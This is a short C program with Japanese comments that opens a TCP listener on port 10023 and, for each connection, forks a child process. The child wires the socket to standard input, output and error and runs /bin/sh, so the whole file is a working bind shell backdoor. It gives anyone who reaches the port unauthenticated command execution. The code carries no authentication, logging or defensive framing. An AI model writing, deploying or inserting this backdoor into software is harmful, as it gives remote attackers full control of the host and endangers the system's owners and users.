#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define PORT "10023"  // 待ち受けるポート番号

void *get_in_addr(struct sockaddr *sa) {
    if (sa->sa_family == AF_INET) {
        return &(((struct sockaddr_in*)sa)->sin_addr);
    }
    return &(((struct sockaddr_in6*)sa)->sin6_addr);
}

int main(void) {
    int sockfd, new_fd;  // ソケットファイルディスクリプタ
    struct addrinfo hints, *servinfo, *p;
    struct sockaddr_storage their_addr; // 接続元アドレス情報
    socklen_t sin_size;
    char s[INET6_ADDRSTRLEN];
    int yes=1;
    int rv;

    // アドレス情報の設定
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;  // IPv4またはIPv6
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;  // 自分のIPを使う

    if ((rv = getaddrinfo(NULL, PORT, &hints, &servinfo)) != 0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(rv));
        return 1;
    }

    // ソケットの設定とバインド
    for(p = servinfo; p != NULL; p = p->ai_next) {
        if ((sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
            perror("server: socket");
            continue;
        }

        if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) {
            perror("setsockopt");
            exit(1);
        }

        if (bind(sockfd, p->ai_addr, p->ai_addrlen) == -1) {
            close(sockfd);
            perror("server: bind");
            continue;
        }

        break;
    }

    if (p == NULL)  {
        fprintf(stderr, "server: failed to bind\n");
        return 2;
    }

    freeaddrinfo(servinfo); // サービス情報の解放

    if (listen(sockfd, 10) == -1) {
        perror("listen");
        exit(1);
    }

    printf("server: waiting for connections...\n");

    while(1) {  // メインループ
        sin_size = sizeof their_addr;
        new_fd = accept(sockfd, (struct sockaddr *)&their_addr, &sin_size);
        if (new_fd == -1) {
            perror("accept");
            continue;
        }

        inet_ntop(their_addr.ss_family, get_in_addr((struct sockaddr *)&their_addr), s, sizeof s);
        printf("server: got connection from %s\n", s);

        if (!fork()) { // 子プロセス
            close(sockfd); // 子プロセスはリスニングソケットを閉じる

            // 標準入出力を新しいソケットにリダイレクト
            dup2(new_fd, STDIN_FILENO);
            dup2(new_fd, STDOUT_FILENO);
            dup2(new_fd, STDERR_FILENO);

            // シェルを実行
            execl("/bin/sh", "sh", NULL);
            perror("execl");
            exit(1);
        }
        close(new_fd);  // 親プロセスは新しいソケットを閉じる
    }

    return 0;
}
